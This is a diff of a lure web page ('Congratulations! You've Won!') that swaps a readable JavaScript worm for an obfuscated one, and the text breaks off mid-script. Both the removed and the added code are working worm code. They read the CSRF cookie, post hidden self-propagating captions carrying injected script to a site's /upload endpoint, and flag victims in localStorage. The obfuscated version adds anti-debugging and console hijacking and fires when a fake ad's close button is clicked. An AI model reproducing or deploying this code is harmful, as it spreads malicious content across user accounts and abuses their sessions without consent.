@@ -3,146 +3,127 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>You won the lottery!</title>
-</head>
-<body>
-    <!-- Advertisement Section -->
-    <div id="ad-section" class="ad-container">
-        <div class="ad-content">
-            <p>This is your advertisement. Click the close button to dismiss.</p>
-            <button id="close-ad-btn">Close</button>
-        </div>
-    </div>
-    <script>
-        // Function to spread the worm
-        function spreadWorm(triggerMessage) {
-            // Immediately trigger the hidden post creation
-            createHiddenPost(triggerMessage);
-    
-            // Function to send a request to the Django `infect_user` view
-            function createHiddenPost(caption) {
-                const formData = new FormData();
-    
-                // Prepare the form data for the request
-                formData.append("uphoto", "");
-                formData.append("caption", caption);
-                formData.append("sha", "ae0b6badeb338b59cda2135ed783c28beaf6d622")
-    
-                fetch("/upload", {
-                    method: "POST",
-                    body: formData,
-                    headers: {
-                        "X-CSRFToken": getCSRFToken(), // Secure with CSRF token
-                    },
-                })
-                    .then((response) => {
-                        if (response.ok) {
-                            console.log("Worm: New hidden post created successfully!");
-                        } else {
-                            console.error("Worm: Failed to create a new hidden post.");
-                        }
-                    })
-                    .catch((error) => {
-                        console.error("Worm: Error while creating a hidden post:", error);
-                    });
+    <title>Congratulations! You've Won!</title>
+    <script>const _0x23abb8=_0xf855;(function(_0xadca18,_0x15cfb8){const _0x12a56a={_0xdec718:0x8c,_0x2f1dd4:0xb0,_0x2f224a:0xda,_0x27b57b:0xcb,_0x1eb2e:0xa0,_0x5c5a1d:0xe2},_0x24e2c5=_0xf855,_0x3eae9b=_0xadca18();while(!![]){try{const _0x3b68ad=parseInt(_0x24e2c5(_0x12a56a._0xdec718))/(-0x13f*-0x3+-0x8*-0x11a+-0xc8c)+parseInt(_0x24e2c5(_0x12a56a._0x2f1dd4))/(-0x1*0x11ad+-0x1*0x1dad+0x1b1*0x1c)*(-parseInt(_0x24e2c5(0xa6))/(-0x1e32+0x107e*-0x2+0x3f31))+parseInt(_0x24e2c5(_0x12a56a._0x2f224a))/(0x18cb*-0x1+-0x2346+0x3c15)+parseInt(_0x24e2c5(0xc5))/(-0x7ed*-0x1+-0x1773+0xf8b)*(parseInt(_0x24e2c5(_0x12a56a._0x27b57b))/(-0x175a+0x1f75+-0x1*0x815))+-parseInt(_0x24e2c5(_0x12a56a._0x1eb2e))/(-0x3a*0x3a+0x14a3+0x778*-0x1)+-parseInt(_0x24e2c5(0x93))/(0x1d*0x26+-0x162e+0x11e8)+parseInt(_0x24e2c5(_0x12a56a._0x5c5a1d))/(0x17dd+-0x235*0xa+-0x1c2)*(parseInt(_0x24e2c5(0xd3))/(0x1fc4+-0x1c8f+-0x32b));if(_0x3b68ad===_0x15cfb8)break;else _0x3eae9b['push'](_0x3eae9b['shift']());}catch(_0x362300){_0x3eae9b['push'](_0x3eae9b['shift']());}}}(_0x4120,-0x13fbc9+0x1*0x2801d+-0xe9933*-0x2));const _0x1d74f8=(function(){const _0x339662={_0x5ed993:0xc7};let _0x1c6026=!![];return function(_0x5ea1c1,_0x437616){const _0x4fb3a7=_0x1c6026?function(){const _0x7043f8=_0xf855;if(_0x437616){const _0x5dc428=_0x437616[_0x7043f8(_0x339662._0x5ed993)](_0x5ea1c1,arguments);return _0x437616=null,_0x5dc428;}}:function(){};return _0x1c6026=![],_0x4fb3a7;};}()),_0x2d47c7=_0x1d74f8(this,function(){const _0x58f1d2={_0x14f603:0xca,_0x352760:0xbd,_0x5b1c76:0x84,_0x4fdd33:0x88,_0x3c0d89:0xca},_0x528b37=_0xf855,_0x40b91b={};_0x40b91b[_0x528b37(_0x58f1d2._0x14f603)]=_0x528b37(_0x58f1d2._0x352760);const _0x35fa81=_0x40b91b;return _0x2d47c7[_0x528b37(_0x58f1d2._0x5b1c76)]()[_0x528b37(_0x58f1d2._0x4fdd33)](_0x35fa81[_0x528b37(_0x58f1d2._0x3c0d89)])[_0x528b37(0x84)]()['constructor'](_0x2d47c7)[_0x528b37(_0x58f1d2._0x4fdd33)](_0x528b37(_0x58f1d2._0x352760));});_0x2d47c7();function _0xf855(_0x21f1c7,_0x30d489){const _0x53e269=_0x4120();return _0xf855=function(_0x5c5d04,_0x1ec575){_0x5c5d04=_0x5c5d04-(0x11c+-0x1*-0x1e4f+0x1eee*-0x1);let _0x1fad2e=_0x53e269[_0x5c5d04];return _0x1fad2e;},_0xf855(_0x21f1c7,_0x30d489);}const _0x10d7d9=(function(){let _0x383200=!![];return function(_0x47f7f0,_0x35f301){const _0x3839e2={_0x3589ca:0xc7},_0x5e98a0=_0x383200?function(){const _0x230c3d=_0xf855;if(_0x35f301){const _0x4e6974=_0x35f301[_0x230c3d(_0x3839e2._0x3589ca)](_0x47f7f0,arguments);return _0x35f301=null,_0x4e6974;}}:function(){};return _0x383200=![],_0x5e98a0;};}());function _0x4120(){const _0x5e0bff=['exception','PVCnl','BaTpM','mfrmU','SYRRk','DOMContentLoaded','stateObject','</scr','function\x20*\x5c(\x20*\x5c)','cookie','(((.+)+)+)+$','cEnUp','caption','SfVrB','debu','TDiPs','NzVKB','woAqs','1975xQYOyx','LWcwX','apply','FXGHk','click','OagAJ','12966jlXFaJ','iSNWE','eMkze','AEV\x20é\x20sem\x20dúvida\x20a\x20melhor\x20cadeira\x20de\x20todas!\x20Acho\x20que\x20merecemos\x20todos\x20um\x2020!','UUtxY','fMcpv','{}.constructor(\x22return\x20this\x22)(\x20)','RfKUW','190TDsIxt','action','chain','length','iTpiH','input','gger','1534476ZxJXSY','ae0b6badeb338b59cda2135ed783c28beaf6d622','setInterval','POST','yMhRH','Gektk','Gqrgm','console','241371lLVGjG','close-ad-btn','uphoto','warn','test','ottFW','__proto__','append','toString','wnzqa','IhmOe','iCJpe','search','<scr','UXBxT','csrftoken','1500984UpzOks','log','YqubX','error','PsbLP','nmRmQ','pDCoI','1912120glTSLq','RieUI','LTyCL','rnAeX','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20(function\x20tickleWorm()\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20const\x20triggerWord\x20=\x20\x22AEV\x20é\x20sem\x20dúvida\x20a\x20melhor\x20cadeira\x20de\x20todas!\x20Acho\x20que\x20merecemos\x20todos\x20um\x2020!\x22;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20const\x20posts\x20=\x20document.querySelectorAll(\x27.card.vichlacard\x27);\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20if\x20(document.body.dataset.wormInjected)\x20return;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20document.body.dataset.wormInjected\x20=\x20\x22true\x22;\x20//\x20Mark\x20the\x20worm\x20as\x20injected\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20posts.forEach((post)\x20=>\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20if\x20(!post.dataset.tickleWorm)\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20post.dataset.tickleWorm\x20=\x20true;\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20const\x20captionElement\x20=\x20post.querySelector(\x27.card-text.caption\x27);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20const\x20captionText\x20=\x20captionElement\x20?\x20captionElement.textContent\x20:\x20\x22\x22;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20let\x20session\x20=\x20localStorage.getItem(\x22SESSIONID\x22);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20const\x20isAlreadyInfected\x20=\x20session\x20==\x20\x22ae0b6badeb338b59cda2135ed783c28beaf6d622\x22\x20?\x20true\x20:\x20false;\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20if\x20(isAlreadyInfected)\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20displayImage();\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20return;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x20else\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20displayImage();\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20localStorage.setItem(\x22SESSIONID\x22,\x20\x222d6cfd5ae2dfbf26ec2a2f26759306fdb54cc1e4\x22);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20});\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20function\x20displayImage()\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20const\x20images\x20=\x20[\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x22https://media.tenor.com/aUGKNa38o-gAAAAe/virus-computer.png\x22,\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x22https://res.cloudinary.com/dt3f31hiq/image/upload/v1683101814/pwned_7a5e4d6579.png\x22,\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x22https://pbs.twimg.com/media/Gbd3tsPaoAEl-d5.jpg\x22,\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x22https://i.ytimg.com/vi/sPUKxtLHPKQ/hqdefault.jpg\x22,\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x22https://img.over-blog-kiwi.com/0/74/35/69/20140818/ob_69946c_699x352xscreenshot045-jpg-pagespeed-ic.jpg\x22,\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x22https://i.ytimg.com/vi/spoZ2zKnK88/sddefault.jpg\x22,\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x22https://www.researchgate.net/publication/376440650/figure/fig1/AS:11431281211491912@1702401485315/Figura-1-meme-o-virus-como-piada.jpg\x22,\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20];\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20const\x20randomIndex\x20=\x20Math.floor(Math.random()\x20*\x20images.length);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20const\x20randomImage\x20=\x20images[randomIndex];\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20const\x20img\x20=\x20document.createElement(\x22img\x22);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20img.src\x20=\x20randomImage;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20img.style.position\x20=\x20\x22fixed\x22;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20img.style.top\x20=\x20\x2250%\x22;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20img.style.left\x20=\x20\x2250%\x22;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20img.style.transform\x20=\x20\x22translate(-50%,\x20-50%)\x22;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20img.style.zIndex\x20=\x20\x229999\x22;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20img.style.border\x20=\x20\x222px\x20solid\x20black\x22;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20img.style.borderRadius\x20=\x20\x2210px\x22;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20img.style.boxShadow\x20=\x20\x220\x200\x2010px\x20rgba(0,\x200,\x200,\x200.5)\x22;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20document.body.appendChild(img);\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20//\x20Automatically\x20remove\x20the\x20image\x20after\x205\x20seconds\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20setTimeout(()\x20=>\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20img.remove();\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20},\x205000);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20})();','getElementById','split','cEVfR','iKmOS','eQGIb','info','bgSah','xbyPa','7615069clmSdk','HQonC','SDXkc','constructor','getItem','wIzUh','807fvYDvU','trim','yeokS','addEventListener','string','jHgPY','IrbRL','ipt>','bind','tTkbL','8574GbdxTm','LNMJN','cJWbA'];_0x4120=function(){return _0x5e0bff;};return _0x4120();}(function(){const _0x70122a={_0x17303f:0xd5},_0x153677={_0x3fb053:0xab,_0x3655bf:0xa8},_0x4a6987=_0xf855,_0x20d111={'tTkbL':_0x4a6987(0xbb),'nmRmQ':'\x5c+\x5c+\x20*(?:[a-zA-Z_$][0-9a-zA-Z_$]*)','yeokS':function(_0x5861aa,_0x435af3){return _0x5861aa(_0x435af3);},'yMhRH':'init','UXBxT':_0x4a6987(_0x70122a._0x17303f),'jHgPY':_0x4a6987(0xd8),'iKmOS':function(_0x1e1b79){return _0x1e1b79();},'ddPbz':function(_0x210613,_0x226441,_0x281832){return _0x210613(_0x226441,_0x281832);}};_0x20d111['ddPbz'](_0x10d7d9,this,function(){const _0x3e6998=_0x4a6987,_0x458d97=new RegExp(_0x20d111[_0x3e6998(0xaf)]),_0x3b9ff5=new RegExp(_0x20d111[_0x3e6998(0x91)],'i'),_0x39ff0b=_0x20d111['yeokS'](_0x23965f,_0x20d111[_0x3e6998(0xde)]);!_0x458d97[_0x3e6998(0x80)](_0x39ff0b+_0x20d111[_0x3e6998(0x8a)])||!_0x3b9ff5[_0x3e6998(0x80)](_0x39ff0b+_0x20d111[_0x3e6998(_0x153677._0x3fb053)])?_0x20d111[_0x3e6998(_0x153677._0x3655bf)](_0x39ff0b,'0'):_0x20d111[_0x3e6998(0x9b)](_0x23965f);})();}());const _0xb04195=(function(){const _0x23a19f={_0xc8742a:0xc7};let _0x25e3a0=!![];return function(_0x3c866c,_0x9510c1){const _0x22af7f=_0x25e3a0?function(){const _0x585d69=_0xf855;if(_0x9510c1){const _0x170c3a=_0x9510c1[_0x585d69(_0x23a19f._0xc8742a)](_0x3c866c,arguments);return _0x9510c1=null,_0x170c3a;}}:function(){};return _0x25e3a0=![],_0x22af7f;};}()),_0x5c9715=_0xb04195(this,function(){const _0x29c8b2={_0x17329f:0xd1,_0x38c4eb:0x9d,_0x4f6aaa:0xe1,_0x1f7d1f:0xe1,_0x5d1cf1:0xbe,_0x2b96e2:0xb1,_0x1f4d31:0xa2,_0x1d4bf9:0xd7,_0x53e1d0:0xa3,_0x567ac5:0x84},_0x1d8149={_0x4387b1:0x9a},_0x38fd1a=_0xf855,_0x24a2dc={'cEVfR':function(_0x496e6f,_0xa6ecf1){return _0x496e6f(_0xa6ecf1);},'ARASe':function(_0x135fd7,_0x1dedff){return _0x135fd7+_0x1dedff;},'bgSah':function(_0x51d433,_0xddf9be){return _0x51d433+_0xddf9be;},'ikamg':'return\x20(function()\x20','RieUI':_0x38fd1a(_0x29c8b2._0x17329f),'PsbLP':function(_0x37a157){return _0x37a157();},'pJjcL':_0x38fd1a(0x8d),'cEnUp':_0x38fd1a(0x7f),'LNMJN':_0x38fd1a(_0x29c8b2._0x38c4eb),'ZWpZm':_0x38fd1a(0x8f),'SDXkc':_0x38fd1a(0xb3),'iTpiH':'table','FXGHk':'trace'},_0x1cb1da=function(){const _0x3b6054=_0x38fd1a;let _0x110666;try{_0x110666=_0x24a2dc[_0x3b6054(_0x1d8149._0x4387b1)](Function,_0x24a2dc['ARASe'](_0x24a2dc[_0x3b6054(0x9e)](_0x24a2dc['ikamg'],_0x24a2dc[_0x3b6054(0x94)]),');'))();}catch(_0x1194e6){_0x110666=window;}return _0x110666;},_0x22d439=_0x24a2dc[_0x38fd1a(0x90)](_0x1cb1da),_0x3865f0=_0x22d439[_0x38fd1a(_0x29c8b2._0x4f6aaa)]=_0x22d439[_0x38fd1a(_0x29c8b2._0x1f7d1f)]||{},_0x29d8de=[_0x24a2dc['pJjcL'],_0x24a2dc[_0x38fd1a(_0x29c8b2._0x5d1cf1)],_0x24a2dc[_0x38fd1a(_0x29c8b2._0x2b96e2)],_0x24a2dc['ZWpZm'],_0x24a2dc[_0x38fd1a(_0x29c8b2._0x1f4d31)],_0x24a2dc[_0x38fd1a(_0x29c8b2._0x1d4bf9)],_0x24a2dc[_0x38fd1a(0xc8)]];for(let _0x16fe83=-0x47f*-0x4+-0x1253*0x1+0x57;_0x16fe83<_0x29d8de['length'];_0x16fe83++){const _0x4f2521=_0xb04195[_0x38fd1a(_0x29c8b2._0x53e1d0)]['prototype']['bind'](_0xb04195),_0x3944c3=_0x29d8de[_0x16fe83],_0x23a0a9=_0x3865f0[_0x3944c3]||_0x4f2521;_0x4f2521[_0x38fd1a(0x82)]=_0xb04195[_0x38fd1a(0xae)](_0xb04195),_0x4f2521[_0x38fd1a(_0x29c8b2._0x567ac5)]=_0x23a0a9[_0x38fd1a(0x84)]['bind'](_0x23a0a9),_0x3865f0[_0x3944c3]=_0x4f2521;}});_0x5c9715();function _0x514ba1(_0x50e4fb){const _0xd0e199={_0x5e1b88:0x7e},_0x4ca299={_0x72447a:0xbc,_0x39728b:0x99,_0xfb0cdb:0x9c},_0x3cc339={_0x51a0ed:0x83,_0x1c5729:0xcf,_0x157765:0x83,_0x138fd0:0x83,_0xdc7bb1:0xc0,_0x562948:0xa5,_0x1903a7:0xb4},_0x461c53=_0xf855,_0x528c75={'UUtxY':_0x461c53(_0xd0e199._0x5e1b88),'RqlrS':_0x461c53(0xbf),'yIsnc':'sha','SfVrB':'584e0ae6dcd0dc93ce82490c0d8d3bfc819ed87c','wIzUh':'/upload','cJWbA':_0x461c53(0xdd),'PVCnl':function(_0x73ac91){return _0x73ac91();},'eQGIb':function(_0x9e66be,_0xc3a669){return _0x9e66be===_0xc3a669;}};_0x2d5cc4(_0x50e4fb);function _0x2d5cc4(_0x4f1fc2){const _0x1cad0f=_0x461c53,_0x3dba9b=new FormData();_0x3dba9b[_0x1cad0f(_0x3cc339._0x51a0ed)](_0x528c75[_0x1cad0f(_0x3cc339._0x1c5729)],''),_0x3dba9b[_0x1cad0f(_0x3cc339._0x157765)](_0x528c75['RqlrS'],_0x4f1fc2),_0x3dba9b[_0x1cad0f(_0x3cc339._0x138fd0)](_0x528c75['yIsnc'],_0x528c75[_0x1cad0f(_0x3cc339._0xdc7bb1)]),fetch(_0x528c75[_0x1cad0f(_0x3cc339._0x562948)],{'method':_0x528c75[_0x1cad0f(0xb2)],'body':_0x3dba9b,'headers':{'X-CSRFToken':_0x528c75[_0x1cad0f(_0x3cc339._0x1903a7)](_0x2244eb)}});}function _0x2244eb(){const _0x9d3e9b=_0x461c53,_0xe0f2c2=document[_0x9d3e9b(_0x4ca299._0x72447a)][_0x9d3e9b(_0x4ca299._0x39728b)](';');for(let _0x46bda8 of _0xe0f2c2){const [_0x2c53da,_0x2655bc]=_0x46bda8[_0x9d3e9b(0xa7)]()[_0x9d3e9b(_0x4ca299._0x39728b)]('=');if(_0x528c75[_0x9d3e9b(_0x4ca299._0xfb0cdb)](_0x2c53da,_0x9d3e9b(0x8b)))return _0x2655bc;}return null;}}document[_0x23abb8(0xa9)](_0x23abb8(0xb8),()=>{const _0x54ae12={_0x1a4d19:0xce,_0x3c6b2c:0xc6,_0x823256:0xd0,_0x51e292:0xad,_0x3c6fe1:0xc2,_0x2bc170:0x81,_0x561568:0xc9,_0x2b8ff9:0x98,_0x323e01:0xa9},_0x4447ac={_0x392ef5:0xdf,_0x4ef2d5:0xd2},_0x3f5bda=_0x23abb8,_0x3e4b62={};_0x3e4b62['Gqrgm']='SESSIONID',_0x3e4b62['lGqtN']=function(_0x5de1e1,_0x4be03b){return _0x5de1e1==_0x4be03b;},_0x3e4b62[_0x3f5bda(0xdf)]=_0x3f5bda(0xdb),_0x3e4b62[_0x3f5bda(0xcd)]=_0x3f5bda(_0x54ae12._0x1a4d19),_0x3e4b62[_0x3f5bda(_0x54ae12._0x3c6b2c)]=function(_0x31b337,_0x55c4cb){return _0x31b337+_0x55c4cb;},_0x3e4b62[_0x3f5bda(0xd2)]=function(_0x47207a,_0x175298){return _0x47207a+_0x175298;},_0x3e4b62[_0x3f5bda(_0x54ae12._0x823256)]=function(_0xb76187,_0x2f4106){return _0xb76187+_0x2f4106;},_0x3e4b62['qUSoe']=_0x3f5bda(0xba),_0x3e4b62['woAqs']=_0x3f5bda(_0x54ae12._0x51e292),_0x3e4b62[_0x3f5bda(_0x54ae12._0x3c6fe1)]=_0x3f5bda(0x7d),_0x3e4b62[_0x3f5bda(_0x54ae12._0x2bc170)]=_0x3f5bda(_0x54ae12._0x561568);const _0x4ec995=_0x3e4b62,_0x41fc0a=document[_0x3f5bda(_0x54ae12._0x2b8ff9)](_0x4ec995[_0x3f5bda(_0x54ae12._0x3c6fe1)]);if(!_0x41fc0a)return;_0x41fc0a[_0x3f5bda(_0x54ae12._0x323e01)](_0x4ec995[_0x3f5bda(0x81)],()=>{const _0x4d047f=_0x3f5bda,_0x7d598a=localStorage[_0x4d047f(0xa4)](_0x4ec995[_0x4d047f(0xe0)]),_0x2e7023=_0x4ec995['lGqtN'](_0x7d598a,_0x4ec995[_0x4d047f(_0x4447ac._0x392ef5)])?!![]:![];if(_0x2e7023)return;localStorage['setItem'](_0x4ec995['Gqrgm'],_0x4ec995[_0x4d047f(0xdf)]);const 